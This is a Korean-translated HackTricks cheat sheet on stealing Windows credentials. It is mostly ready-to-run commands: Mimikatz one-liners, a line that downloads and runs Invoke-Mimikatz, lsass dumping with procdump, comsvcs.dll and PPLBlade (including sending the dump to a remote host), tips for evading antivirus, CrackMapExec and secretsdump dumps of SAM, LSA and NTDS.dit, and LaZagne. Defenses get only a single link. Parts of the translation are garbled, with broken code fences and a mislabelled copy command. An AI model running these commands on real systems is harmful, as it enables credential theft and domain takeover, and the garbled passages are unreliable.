# Stealing Windows Credentials

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## Mimikatz를 사용한 자격 증명 도용

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

\*\*[이 페이지](credentials-mimikatz.md)\*\*에서 Mimikatz가 수행할 수 있는 다른 작업을 찾아보세요.

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**여기에서 가능한 일부 자격 증명 보호에 대해 알아보세요.**](credentials-protections.md) **이 보호 기능은 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**

## Meterpreter를 사용한 자격 증명

피해자 내부에서 **비밀번호와 해시를 검색**하기 위해 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **을 사용하세요.**

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV 우회

### Procdump + Mimikatz

**SysInternals**의 **Procdump**는 **Microsoft의 정품 도구**이기 때문에 Defender에서 감지되지 않습니다.\
이 도구를 사용하여 **lsass 프로세스를 덤프**하고, 덤프를 **다운로드**하고, 덤프에서 **로컬로 자격 증명을 추출**할 수 있습니다.

{% code title="lsass 덤프하기" %}
```
```
{% endcode %}

```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

{% code title="덤프에서 자격 증명 추출하기" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하여 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 덤프하는 것을 악성으로 감지**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe"** 문자열을 감지하기 때문입니다. 따라서 lsass.exe의 **PID를 procdump에게 인수로 전달하는 것이 더 은밀**합니다.

### **comsvcs.dll**을 사용하여 lsass 덤프하기

`C:\Windows\System32`에서 찾을 수 있는 **comsvcs.dll**은 충돌 발생 시 프로세스 메모리를 덤프하는 역할을 합니다. 이 DLL에는 `rundll32.exe`를 사용하여 호출되는 \*\*`MiniDumpW`\*\*라는 함수가 포함되어 있습니다.\
첫 번째 두 인수를 사용하는 것은 관계가 없지만, 세 번째 인수는 세 가지 구성 요소로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 구성 요소이고, 덤프 파일 위치가 두 번째를 나타내며, 세 번째 구성 요소는 엄격히 **full**이어야 합니다. 대체 옵션은 존재하지 않습니다.\
이 세 가지 구성 요소를 구문 분석한 후, DLL은 덤프 파일을 생성하고 지정된 프로세스의 메모리를 이 파일로 전송합니다.\
**comsvcs.dll**을 사용하여 lsass 프로세스를 덤프하는 것은 procdump를 업로드하고 실행할 필요가 없으므로 실행 가능합니다. 이 방법에 대한 자세한 내용은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에서 설명되어 있습니다.

다음 명령을 사용하여 실행합니다:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**이 프로세스를** [**lssasy**](https://github.com/Hackndo/lsassy)**로 자동화할 수 있습니다.**

### **작업 관리자를 사용하여 lsass 덤프하기**

1. 작업 표시줄에서 마우스 오른쪽 버튼을 클릭하고 작업 관리자를 선택합니다.
2. 자세히 보기를 클릭합니다.
3. 프로세스 탭에서 "로컬 보안 권한 프로세스" 프로세스를 검색합니다.
4. "로컬 보안 권한 프로세스" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "덤프 파일 생성"을 선택합니다.

### procdump을 사용하여 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부인 Microsoft 서명된 이진 파일입니다.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade을 사용하여 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 덤프를 남기지 않고 원격 작업 스테이션으로 전송하면서 메모리 덤프를 난독화하는 Protected Process Dumper 도구입니다.

**주요 기능**:

1. PPL 보호 우회
2. Defender 시그니처 기반 탐지 메커니즘을 피하기 위해 메모리 덤프 파일을 난독화
3. 디스크에 남기지 않고 RAW 및 SMB 업로드 방법을 사용하여 메모리 덤프 업로드 (무파일 덤프)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM 해시 덤프하기

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA 비밀 정보 덤프

#### Description

LSA (Local Security Authority) 비밀 정보 덤프는 Windows 운영 체제에서 저장된 인증 정보를 검색하는 데 사용되는 기술입니다. 이 기술을 사용하면 시스템에 저장된 사용자 계정 비밀번호, 원격 데스크톱 비밀번호, 웹 브라우저 자동 완성 비밀번호 등을 알아낼 수 있습니다.

#### Technique

1. Mimikatz를 다운로드하고 실행합니다.
2. `privilege::debug` 명령을 사용하여 디버그 권한을 얻습니다.
3. `sekurlsa::logonpasswords` 명령을 사용하여 LSA 비밀 정보를 덤프합니다.
4. 덤프된 결과에서 필요한 인증 정보를 찾습니다.

#### Example

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### Mitigation

LSA 비밀 정보 덤프를 방지하기 위해 다음 조치를 취할 수 있습니다:

* 최신 보안 패치를 설치하여 시스템을 업데이트합니다.
* 관리자 권한을 가진 사용자만 시스템에 액세스할 수 있도록 제한합니다.
* 강력한 암호 정책을 설정하고, 주기적으로 암호를 변경하도록 유도합니다.
* 보안 솔루션을 사용하여 악성 코드 및 악성 동작을 탐지하고 차단합니다.
* LSA 보안 정책을 구성하여 비밀 정보 덤프를 방지합니다.

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### 대상 DC에서 NTDS.dit 덤프하기

```plaintext
NTDS.dit 파일은 Windows 도메인 컨트롤러(DC)에서 사용자 계정 정보를 저장하는 데이터베이스입니다. 이 파일을 덤프하여 계정 정보를 획득할 수 있습니다.

1. DC에 로그인합니다.
2. 관리자 권한으로 명령 프롬프트를 엽니다.
3. ntdsutil 명령을 실행합니다.
4. activate instance ntds 명령을 실행합니다.
5. ifm 명령을 실행합니다.
6. create full <경로> 명령을 실행하여 NTDS.dit 파일을 지정한 경로에 저장합니다.
7. quit 명령을 실행하여 ntdsutil을 종료합니다.
```

위의 단계를 따라하면 대상 DC에서 NTDS.dit 파일을 덤프하여 계정 정보를 획득할 수 있습니다.

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### 대상 DC에서 NTDS.dit 암호 기록 덤프하기

```plaintext
1. 먼저, 관리자 권한으로 명령 프롬프트를 엽니다.
2. 다음 명령을 실행하여 NTDS.dit 파일을 복사합니다.
```

```plaintext
ntdsutil
activate instance ntds
ifm
create full c:\temp
quit
```

3. 복사된 NTDS.dit 파일을 로컬 컴퓨터로 복사합니다.
4.  다음 명령을 실행하여 NTDS.dit 파일을 해시로 변환합니다.

    ````
    ```plaintext
    secretsdump.py -ntds ntds.dit -system SYSTEM hive -outputfile hashes.txt
    ````
5. 해시 파일인 `hashes.txt`에는 암호 기록이 포함되어 있습니다.

```

이렇게 하면 대상 DC에서 NTDS.dit 파일의 암호 기록을 덤프할 수 있습니다.
```

\#\~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

````
### 각 NTDS.dit 계정의 pwdLastSet 속성 표시

To show the pwdLastSet attribute for each NTDS.dit account, you can use the following PowerShell command:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
````

This command retrieves all user accounts from the NTDS.dit database and displays the Name and pwdLastSet attributes for each account.

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM 및 SYSTEM 도용하기

이 파일들은 _C:\windows\system32\config\SAM_ 및 \_C:\windows\system32\config\SYSTEM\_에 **위치**해야 합니다. 그러나 그들은 보호되어 있기 때문에 **일반적인 방식으로 복사할 수 없습니다**.

### 레지스트리로부터

이 파일들을 도용하는 가장 쉬운 방법은 레지스트리에서 복사하는 것입니다:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Kali** 기계로 해당 파일을 다운로드하고 다음을 사용하여 해시를 추출하십시오:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### 볼륨 그림자 복사

이 서비스를 사용하여 보호된 파일을 복사할 수 있습니다. 관리자 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

하지만 **Powershell**에서도 동일한 작업을 수행할 수 있습니다. 다음은 **SAM 파일을 복사하는 방법의 예시**입니다 (사용된 하드 드라이브는 "C:"이며 C:\users\Public에 저장됩니다). 하지만 이를 사용하여 보호된 파일을 복사할 수 있습니다:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```

책에서의 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

마지막으로, [**PS 스크립트 Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 사본을 만들 수도 있습니다.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory 자격 증명 - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며 사용자 개체, 그룹 및 그들의 멤버십에 대한 중요한 데이터를 보유합니다. 도메인 사용자의 **비밀번호 해시**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 _**%SystemRoom%/NTDS/ntds.dit**_에 위치합니다.

이 데이터베이스에서는 세 가지 주요 테이블이 유지됩니다:

* **데이터 테이블**: 이 테이블은 사용자 및 그룹과 같은 개체에 대한 세부 정보를 저장하는 역할을 담당합니다.
* **링크 테이블**: 그룹 멤버십과 같은 관계를 추적합니다.
* **SD 테이블**: 저장된 개체의 보안 및 액세스 제어를 보장하기 위해 각 개체의 **보안 기술자**가 여기에 저장됩니다.

자세한 정보: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 \_Ntdsa.dll\_을 사용하여 해당 파일과 상호 작용하며 \_lsass.exe\_에서 사용됩니다. 그런 다음 **NTDS.dit** 파일의 **일부**는 **`lsass`** 메모리 내에 위치할 수 있습니다 (성능 향상을 위해 **캐시**를 사용하여 최근 액세스한 데이터를 찾을 수 있습니다).

#### NTDS.dit 내의 해시 해독

해시는 3번 암호화됩니다:

1. **BOOTKEY**와 **RC4**를 사용하여 \*\*비밀번호 암호화 키 (PEK)\*\*를 해독합니다.
2. **PEK**와 **RC4**를 사용하여 **해시**를 해독합니다.
3. **DES**를 사용하여 **해시**를 해독합니다.

**PEK**은 **모든 도메인 컨트롤러에서 동일한 값**을 가지고 있지만, **NTDS.dit** 파일 내에서 **도메인 컨트롤러의 SYSTEM 파일의 BOOTKEY**를 사용하여 **암호화**됩니다 (도메인 컨트롤러 간에 다릅니다). 이것이 NTDS.dit 파일에서 자격 증명을 가져오려면 **NTDS.dit 및 SYSTEM 파일** (_C:\Windows\System32\config\SYSTEM_)이 필요한 이유입니다.

### Ntdsutil을 사용하여 NTDS.dit 복사

Windows Server 2008부터 사용 가능합니다.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

[**volume shadow copy**](./#stealing-sam-and-system) 트릭을 사용하여 **ntds.dit** 파일을 복사할 수도 있습니다. **SYSTEM 파일**의 사본도 필요합니다 (다시 말하지만, 레지스트리에서 덤프하거나 [**volume shadow copy**](./#stealing-sam-and-system) 트릭을 사용하세요).

### **NTDS.dit에서 해시 추출하기**

**NTDS.dit** 및 **SYSTEM** 파일을 **획득한 후**, \_secretsdump.py\_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

유효한 도메인 관리자 사용자를 사용하여 **자동으로 추출**할 수도 있습니다:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

**큰 NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.

마지막으로, **metasploit 모듈**인 _post/windows/gather/credentials/domain\_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`을 사용할 수도 있습니다.

### **NTDS.dit에서 도메인 객체를 SQLite 데이터베이스로 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. NTDS.dit 파일을 이미 검색한 경우, 비밀 정보뿐만 아니라 전체 객체와 속성도 추출하여 추가 정보 추출이 가능합니다.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` 하이브는 선택 사항이지만 비밀 해독을 허용합니다 (NT 및 LM 해시, 추가 자격 증명 (평문 암호, Kerberos 또는 신뢰 키, NT 및 LM 암호 기록)). 다음과 같은 정보가 추출됩니다: 해시와 함께 사용자 및 컴퓨터 계정, UAC 플래그, 마지막 로그온 및 암호 변경 시간, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, 조직 단위 트리 및 멤버십, 신뢰할 수 있는 도메인과 신뢰 유형, 방향 및 속성...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 바이너리를 다운로드하세요. 이 바이너리를 사용하여 여러 소프트웨어에서 자격 증명을 추출할 수 있습니다.

```
lazagne.exe all
```

## SAM 및 LSASS에서 자격 증명을 추출하기 위한 다른 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용될 수 있습니다. 다음에서 다운로드할 수 있습니다: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM 파일에서 자격 증명을 추출합니다.

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

[여기](http://www.tarasco.org/security/pwdump\_7)에서 다운로드하고 실행만 하면 비밀번호가 추출됩니다.

## 방어

[여기](credentials-protections.md)에서 일부 자격 증명 보호에 대해 알아보세요.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)을 **팔로우**하세요.
* 여러분의 해킹 기술을 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 공유하세요.

</details>
